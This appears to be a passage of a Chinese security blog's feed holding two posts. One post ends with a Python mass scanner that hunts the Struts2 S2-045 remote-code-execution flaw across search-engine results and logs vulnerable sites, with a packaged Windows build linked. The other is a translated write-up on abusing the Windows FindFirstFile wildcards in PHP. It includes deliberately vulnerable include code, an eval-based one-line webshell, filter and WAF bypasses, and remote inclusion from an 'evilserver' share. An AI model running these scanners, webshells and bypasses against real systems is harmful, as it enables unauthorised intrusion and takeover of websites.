class="line">                standardURL = [url[<span class="string">'href'</span>][:url[<span class="string">'href'</span>].index(<span class="string">'.do'</span>)]+<span class="string">'.do'</span> <span class="keyword">for</span> url <span class="keyword">in</span> text <span class="keyword">if</span> <span class="string">'.do'</span> <span class="keyword">in</span> url[<span class="string">'href'</span>]]</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>] <span class="keyword">for</span> url <span class="keyword">in</span> text]</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            print(<span class="string">"HTTPERROR"</span>)</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        i += <span class="number">10</span></div><div class="line">        n += <span class="number">1</span></div><div class="line">        <span class="keyword">yield</span> standardURL</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</div><div class="line">        print(usage)</div><div class="line">        <span class="keyword">for</span> k,v <span class="keyword">in</span> keyword.items():</div><div class="line">            print(<span class="string">"%s is %s"</span>%(k, v))</div><div class="line">        sys.exit()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> urlList <span class="keyword">in</span> returnURLList():</div><div class="line">        <span class="keyword">for</span> actionURL <span class="keyword">in</span> urlList:</div><div class="line">            text, code = poc(actionURL)</div><div class="line">            <span class="keyword">if</span> <span class="string">'hereisaexp'</span> <span class="keyword">in</span> text:</div><div class="line">                print(str(code) + <span class="string">"----Successful----"</span> + actionURL + <span class="string">'\n'</span>)</div><div class="line">                <span class="keyword">with</span> open(<span class="string">"AvailableURL.txt"</span>,<span class="string">"a"</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(actionURL+<span class="string">'\n'</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                print(str(code)+<span class="string">'----'</span>+actionURL+<span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p><strong><a href="http://file.codecat.one" target="_blank" rel="external">下载地址</a></strong></p>
<p><strong>打包了win版，大家可以直接使用，例如在该exe目录下执行<del>（更新的并未打包出exe，如有需要可以自行用pyinstaller打包）</del></strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s2-045.exe 9 10</div></pre></td></tr></table></figure></p>
<p><strong>其他用法参照上面</strong><br><strong>转载请注明出处</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事&lt;/p&gt;
&lt;p&gt;测试图&lt;br&gt;&lt;img src=&quot;https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png&quot; alt=&quot;TIM图片20170307212124.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Windows FindFirstFile利用</title>
    <link href="http://akkuman.coding.me/2017/03/04/Windows-FindFirst-Exploit.html"/>
    <id>http://akkuman.coding.me/2017/03/04/Windows-FindFirst-Exploit.html</id>
    <published>2017-03-04T07:16:27.000Z</published>
    <updated>2017-03-04T07:59:41.623Z</updated>
    
    <content type="html"><![CDATA[<p>目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。</p>
<p>利用方法很简单，我们只要将文件名不可知部分之后的字符用”&lt;”或者”&gt;”代替即可，不过要注意一点是，只使用一个”&lt;”或者”&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求”1&lt;”或者”1&gt;”都是访问不到文件的，需要”1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。<br><a id="more"></a><br>我们来做个简单的测试，测试代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//1.php</span></div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p> 再在同目录下新建一个文件名为”123456.txt”的文件，内容为<code>phpinfo()</code>函数，请求<code>/1.php?file=1&lt;&lt;</code>即可包含。<br> <img src="https://ooo.0o0.ooo/2017/03/04/58ba6a75887a8.png" alt="d8336189e9e8ab752ec855e7ed94a9b7.jpg.png"></p>
<h1 id="常用的漏洞代码"><a href="#常用的漏洞代码" class="headerlink" title="常用的漏洞代码"></a>常用的漏洞代码</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2> <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>($_GET[page]);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>(<span class="string">'./action/'</span> . $_GET[page]);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'./action/show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>(<span class="string">'./action/'</span>. $_GET[page] . <span class="string">'.php'</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'./action/show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h1 id="相关代码："><a href="#相关代码：" class="headerlink" title="相关代码："></a>相关代码：</h1><ol>
<li><p>php中代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>123456.txt中代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> phpinfo() <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>123456.TXT里面可以换成一句话木马，代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">"admin"</span>]) <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>url:<a href="http://127.0.0.1/1.php?file=12" target="_blank" rel="external">http://127.0.0.1/1.php?file=12</a>&lt;&lt;<br>密码：admin<br><strong>注意</strong>：txt里面书写php代码不能换行写，最好是在同一行书写【原因待查明】</p>
<p><img src="https://ooo.0o0.ooo/2017/03/04/58ba6bd6354d3.png" alt="acccc1eb9b5be30878b4f979f2edadfc.jpg.png"></p>
<h1 id="windows的文件系统机制引发的PHP路径爆破问题分析"><a href="#windows的文件系统机制引发的PHP路径爆破问题分析" class="headerlink" title="windows的文件系统机制引发的PHP路径爆破问题分析"></a>windows的文件系统机制引发的PHP路径爆破问题分析</h1><h2 id="开场白"><a href="#开场白" class="headerlink" title="开场白"></a>开场白</h2><p>此次所披露的是以下网页中提出的问题所取得的测试结果：</p>
<p><a href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="external">http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">255</span>; $i++) &#123;</div><div class="line">		$url = <span class="string">'1.ph'</span> . chr($i);</div><div class="line">		$tmp = @file_get_contents($url);</div><div class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($i) . <span class="string">" "</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>已知1.php存在，以上脚本访问的结果是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.php</div><div class="line">1.phP</div><div class="line">1.ph&lt;</div><div class="line">1.ph&gt;</div></pre></td></tr></table></figure></p>
<p>都能得到返回。<br>前两种能返回结果是总所周知的（因为windows的文件系统支持大小的互转的机制），另外的两种返回引起了我们的注意。</p>
<p>测试php版本：PHP4.9,PHP5.2,PHP5.3,PHP6.0</p>
<p>测试系统：WINXP SP3 X32,WINXP SP2 X64，WIN7,WIN2K3</p>
<p>经测试我们得出的结论是：<strong>该漏洞影响所有的windows+php版本</strong></p>
<h2 id="深入探查模糊测试的结果"><a href="#深入探查模糊测试的结果" class="headerlink" title="深入探查模糊测试的结果"></a>深入探查模糊测试的结果</h2><p>为了继续深入探查关于该bug的信息，我们对demo做了些许修改:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">for</span> ($j=<span class="number">0</span>; $i&lt;<span class="number">256</span>; $j++) &#123;</div><div class="line">		<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">256</span>; $i++) &#123;</div><div class="line">			$url = <span class="string">'1.p'</span> . chr($j) . chr($i);</div><div class="line">			$tmp = @file_get_contents($url);</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($j) . chr($i) . <span class="string">" "</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在调试php解释器的过程中，我们将此“神奇”的漏洞归结为一个Winapi 函数FindFirstFile(）所产生的结果<a href="http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85" target="_blank" rel="external">(http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx)</a>.aspx).更好玩的是，当跟踪函数调用栈的过程中我们发现字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。这在2007年msdn公开的文档中被提及：<a href="http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3</a></p>
<p>但是此bug至今未被任何windows旗下所发行的任何版本修复!</p>
<p>我们要阐明的是，该函数FindFirstFile()在php下的运用远远不至于file_get_contents().关于该bug可以利用的函数我们已经列了如下一表：</p>
<p>此外，我们还发现该利用也可以被运用到c++中，以下采用来自msdn的例子：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">void</span> _tmain(<span class="keyword">int</span> argc, TCHAR *argv[])&#123;</div><div class="line">	WIN32_FIND_DATA FindFileData;</div><div class="line">	HANDLE hFind;</div><div class="line">	<span class="keyword">if</span>( argc != <span class="number">2</span> )&#123;</div><div class="line">		_tprintf(TEXT(<span class="string">"Usage: %s [target_file] "</span>), argv[<span class="number">0</span>]);</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	_tprintf (TEXT(<span class="string">"Target file is %s "</span>), argv[<span class="number">1</span>]);</div><div class="line">	hFind = FindFirstFile(argv[<span class="number">1</span>], &amp;FindFileData);</div><div class="line">	<span class="keyword">if</span> (hFind == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="built_in">printf</span> (<span class="string">"FindFirstFile failed (%d) "</span>, GetLastError());</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		_tprintf (TEXT(<span class="string">"The first file found is %s "</span>), FindFileData.cFileName);</div><div class="line">		FindClose(hFind);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当传入参数”c:o&lt;”时，成功访问到boot.ini文件。</p>
<h2 id="利用方法总结"><a href="#利用方法总结" class="headerlink" title="利用方法总结"></a>利用方法总结</h2><ol>
<li><p>当调用FindFirstFile()函数时，”&lt;”被替换成” <em> ”,这意味该规则可以使”&lt;”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，**为了确保能够使”&lt;”被替换成”</em>”,应当采用”&lt;&lt;”**</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:include(‘shell&lt;&apos;);  或者include(‘shell&lt;&lt;&apos;);    //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。</div></pre></td></tr></table></figure>
</li>
<li><p>当调用FindFirstFile()函数时，”&gt;”被替换成”?”,这意味这”&gt;”可以替换单个任意字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：include(‘shell.p&gt;p&apos;);    //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。</div></pre></td></tr></table></figure>
</li>
<li><p>当调用FindFirstFile()函数时，”””(双引号)被替换成”.”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:include(‘shell”php&apos;);    //===&gt;include(‘shell.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>如果文件名第一个字符是”.”的话，读取时可以忽略之</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：fopen(‘.htacess&apos;);  //==&gt;fopen(‘htacess&apos;);   //加上第一点中的利用 ==&gt;fopen(‘h&lt;&lt;&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>文件名末尾可以加上一系列的/或者的合集，你也可以在/或者中间加上.字符，只要确保最后一位为”.”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：fopen(“config.ini\.// ///.”);==&gt;  fopen(‘config.ini./..&apos;); ==&gt;fopen(‘config.ini/////.&apos;)==&gt;fopen(‘config.ini…..&apos;)   //译者注：此处的利用我不是很理解，有何作用？截断？</div></pre></td></tr></table></figure>
</li>
<li><p>该函数也可以调用以”\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过allow_url_fopen=Off 并最终导致一个RFI（远程文件包含）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：include (‘\evilservershell.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>用以下方法还可以切换文件的盘名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include(‘\.C:myfile.php......D:anotherfile.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>选择磁盘命名语法可以用来绕过斜线字符过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_get_contents(‘C:boot.ini&apos;); //==&gt;  file_get_contents (‘C:/boot.ini&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>在php的命令行环境下（php.exe）,关于系统保留名文件的利用细节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:file_get_contents(‘C:/tmp/con.jpg&apos;); //此举将会无休无止地从CON设备读取0字节，直到遇到eof</div><div class="line"></div><div class="line">EXAMPLE:file_put_contents(‘C:/tmp/con.jpg&apos;,chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="更深入的利用方法"><a href="#更深入的利用方法" class="headerlink" title="更深入的利用方法"></a>更深入的利用方法</h2><p>除了以上已经展示的方法，你可以用下面的姿势来绕过WAF或者文件名过滤</p>
<p>请思考该例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	file_get_contents(<span class="string">"/images/"</span>.$_GET[<span class="string">'a'</span>].<span class="string">".jpg"</span>);</div><div class="line">	<span class="comment">//or another function from Table 1, i.e. include().</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问test.php?a=../a&lt;%00</p>
<p>可能出现两种结果</p>
<ol>
<li><p>Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Invalid argument in。。。</p>
</li>
<li><p>Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Permission denied。。</p>
</li>
</ol>
<p>如果是第一种情况，说明不存在a打头的文件，第二种则存在。</p>
<p>此外，有记录显示，有时网站会抛出如下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Warning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied..</div></pre></td></tr></table></figure></p>
<p>这说明该文件夹下存在一个以上以a打头的文件（夹），并且第一个就是admin_h1d3。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>实验告诉我们，php本身没有那么多的漏洞，我们所看到是：过分的依赖于另一种程序语言（注：如文中的漏洞产自与winapi的一个BUG），并且直接强 制使用，将会导致细微的错误(bug)，并最终造成危害(vul).这样便拓宽了模糊测试的范畴（译者注：并不仅仅去研究web层面，而深入到系统底层），并最终导致IDS，IPS的规则更新。诚然，代码需要保护，需要补丁，需要升级与扩充。但是，这并不是我们真正要去关注的问题。在当下，我认为我们 更谨慎地去书写更多更严厉的过滤规则，正如我们一直在做的一样。任重道远，精益求精。</p>
<p>因为这是基础应用层的问题，所以我们猜想类似的问题可能出现在其他web应用中。于是我们还测试了mysql5,而实验结果表明，mysql5并不存在类似的漏洞。但是我们仍认为：类似的漏洞将会出现在诸如Perl、Python、Ruby等解释性语言上。</p>
<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><blockquote>
<p>PHP application source code audits advanced technology:</p>
<p><a href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="external">http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a></p>
<p>MSDN FindFirstFile Function reference:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx</a></p>
<p>MSDN comments history:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3</a></p>
<p>MSDN article «Naming Files, Paths, and Namespaces»:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx</a></p>
<p>Technet article «Managing Files and Directories»:</p>
<p><a href="http://technet.microsoft.com/en-us/library/cc722482.aspx" target="_blank" rel="external">http://technet.microsoft.com/en-us/library/cc722482.aspx</a></p>
<p>Paper «Technique of quick exploitation of 2blind SQL Injection»:</p>
<p><a href="http://www.exploit-db.com/papers/13696/" target="_blank" rel="external">http://www.exploit-db.com/papers/13696/</a></p>
</blockquote>
<hr>
<p>全文完。</p>
<p>注：该文是2011年底发表的一篇白皮书，至今该bug依然存在。我在几个月前做CUIT的一个CTF时偶遇了一道该bug的利用，当时便是看的此文，当时只是粗粗读了一下，写了一个php的脚本去跑目录。今回闲来无事，翻译整理了一番。</p>
<p>文章转自群友</p>
<h1 id="版权声明："><a href="#版权声明：" class="headerlink" title="版权声明："></a>版权声明：</h1><p>文章所设计内容包括两部分<br>一是法师的书籍《代码审计-企业级web代码安全架构》<br>二是来自群友@evil7提供的资料<br>以下为资料原文：<br><a href="http://www.169it.com/blog_article/2302639890.html" target="_blank" rel="external">http://www.169it.com/blog_article/2302639890.html</a><br><a href="https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki" target="_blank" rel="external">https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。&lt;/p&gt;
&lt;p&gt;利用方法很简单，我们只要将文件名不可知部分之后的字符用”&amp;lt;”或者”&amp;gt;”代替即可，不过要注意一点是，只使用一个”&amp;lt;”或者”&amp;gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求”1&amp;lt;”或者”1&amp;gt;”都是访问不到文件的，需要”1&amp;lt;&amp;lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。&lt;br&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://akkuman.coding.me/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
  </entry>
  
</feed>
